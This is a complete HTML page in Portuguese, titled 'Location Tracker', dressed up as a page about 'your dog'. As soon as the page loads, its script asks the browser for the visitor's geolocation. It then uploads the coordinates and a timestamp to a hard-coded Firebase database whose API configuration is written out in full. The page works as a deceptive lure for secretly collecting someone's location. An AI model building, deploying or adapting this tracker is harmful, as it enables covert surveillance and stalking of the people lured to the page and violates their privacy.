<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #fffdf5;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }
        .thumbnail {
            width: 100%;
            height: 250px;
            border-radius: 12px;
            object-fit: cover;
            margin-bottom: 25px;
            cursor: pointer;
        }
        button {
            width: 100%;
            padding: 14px 20px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
            background: #218085;
            color: white;
        }
        button:hover { background: #1d7480; transform: translateY(-2px); }
        .results { display: none; }
        .results.active { display: block; }
        .result-item {
            background: rgba(33, 128, 141, 0.06);
            border-left: 4px solid #218085;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 6px;
        }
        .result-label { color: #626c71; font-size: 12px; text-transform: uppercase; margin-bottom: 5px; }
        .result-value { color: #134252; font-size: 16px; font-weight: 600; font-family: 'Courier New', monospace; word-break: break-all; }
        .error { display: none; color: #c01530; background: rgba(192, 21, 47, 0.1); padding: 15px; border-radius: 6px; margin-bottom: 20px; }
        .error.active { display: block; }
        .loading { display: none; text-align: center; color: #626c71; margin: 20px 0; }
        .loading.active { display: block; }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(33, 128, 141, 0.2);
            border-top-color: #218085;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 300'%3E%3Crect fill='%23667eea' width='400' height='300'/%3E%3Ctext x='50%' y='50%' font-size='48' fill='white' text-anchor='middle' dominant-baseline='middle'%3Eüêï Seu Cachorro%3C/text%3E%3C/svg%3E" alt="Thumbnail" class="thumbnail">
        
        <button id="getLocationBtn">üéØ Visualizar Localiza√ß√£o</button>

        <div class="loading" id="loading">
            <span class="spinner"></span> Localizando...
        </div>

        <div class="error" id="error"></div>

        <div class="results" id="results">
            <div class="result-item">
                <div class="result-label">Latitude</div>
                <div class="result-value" id="latitude">-</div>
            </div>
            <div class="result-item">
                <div class="result-label">Longitude</div>
                <div class="result-value" id="longitude">-</div>
            </div>
            <div class="result-item">
                <div class="result-label">Precis√£o (m)</div>
                <div class="result-value" id="accuracy">-</div>
            </div>
            <div class="result-item">
                <div class="result-label">Data/Hora</div>
                <div class="result-value" id="timestamp">-</div>
            </div>
            <button id="mapBtn">üó∫Ô∏è Ver no Mapa</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js';
        import { getDatabase, ref, push, set } from 'https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js';

        const firebaseConfig = {
            apiKey: "AIzaSyAueHmQZ8DbpOl2ZnS4p7zw5kLyNGJ4K8o",
            authDomain: "location-tracker-e3ee8.firebaseapp.com",
            projectId: "location-tracker-e3ee8",
            storageBucket: "location-tracker-e3ee8.firebasestorage.app",
            messagingSenderId: "362391545154",
            appId: "1:362391545154:web:c9d60b45370e304f9554db",
            databaseURL: "https://location-tracker-e3ee8-default-rtdb.firebaseio.com"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let currentPos = null;

        function showLoading(show) {
            document.getElementById('loading').style.display = show ? 'block' : 'none';
        }

        function showError(msg) {
            const errorEl = document.getElementById('error');
            errorEl.textContent = msg;
            errorEl.style.display = 'block';
            document.getElementById('results').style.display = 'none';
            showLoading(false);
        }

        function getLocation() {
            document.getElementById('error').style.display = 'none';
            document.getElementById('results').style.display = 'none';
            showLoading(true);

            if (!navigator.geolocation) {
                showError('‚ùå Geolocation n√£o suportado');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                pos => {
                    const coords = pos.coords;
                    const date = new Date().toLocaleString('pt-BR');
                    
                    document.getElementById('latitude').textContent = coords.latitude.toFixed(6);
                    document.getElementById('longitude').textContent = coords.longitude.toFixed(6);
                    document.getElementById('accuracy').textContent = coords.accuracy.toFixed(2);
                    document.getElementById('timestamp').textContent = date;

                    currentPos = { lat: coords.latitude, lon: coords.longitude };

                    showLoading(false);
                    document.getElementById('results').style.display = 'block';

                    // Salvar no Firebase
                    const locRef = ref(db, 'locations');
                    const newLocRef = push(locRef);
                    set(newLocRef, {
                        latitude: coords.latitude.toFixed(6),
                        longitude: coords.longitude.toFixed(6),
                        dataHora: date,
                        timestamp: Date.now()
                    }).then(() => {
                        console.log('‚úÖ Salvo no Firebase!');
                        alert('‚úÖ Localiza√ß√£o enviada!');
                    }).catch(err => {
                        console.error('‚ùå Erro Firebase:', err);
                    });
                },
                err => {
                    showError('‚ùå ' + err.message);
                }
            );
        }

        document.getElementById('getLocationBtn').addEventListener('click', getLocation);
        document.getElementById('mapBtn').addEventListener('click', () => {
            if(currentPos) window.open(`https://www.openstreetmap.org/#map=15/${currentPos.lat}/${currentPos.lon}`, '_blank');
        });

        window.addEventListener('load', getLocation);
    </script>
</body>
</html>
